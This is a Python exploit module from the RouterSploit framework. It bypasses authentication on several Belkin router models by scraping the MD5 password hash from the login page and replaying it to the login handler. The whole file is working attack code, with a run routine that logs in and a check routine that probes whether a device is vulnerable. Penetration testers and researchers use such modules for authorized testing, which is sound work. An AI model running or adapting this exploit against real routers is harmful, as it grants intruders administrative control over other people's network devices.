import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Belkin Auth Bypass",
        "description": "Module exploits Belkin authentication using MD5 password disclosure.",
        "authors": (
            "Gregory Smiley <gsx0r.sec[at]gmail.com>",  # vulnerability discovery
            "BigNerd95 (Lorenzo Santina)",  # improved exploit and routersploit module
        ),
        "references": (
            "https://securityevaluators.com/knowledge/case_studies/routers/belkin_n900.php",
            "https://www.exploit-db.com/exploits/40081/",
        ),
        "devices": (
            "Belkin Play Max (F7D4401)",
            "Belkin F5D8633",
            "Belkin N900 (F9K1104)",
            "Belkin N300 (F7D7301)",
            "Belkin AC1200",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            payload = "pws=" + val[0] + "&arc_action=login&action=Submit"

            login = self.http_request(
                method="POST",
                path="/login.cgi",
                data=payload
            )
            if login is None:
                return

            error = re.search('loginpserr.stm', login.text)

            if not error:
                print_success("Exploit success, you are now logged in!")
                return

        print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable
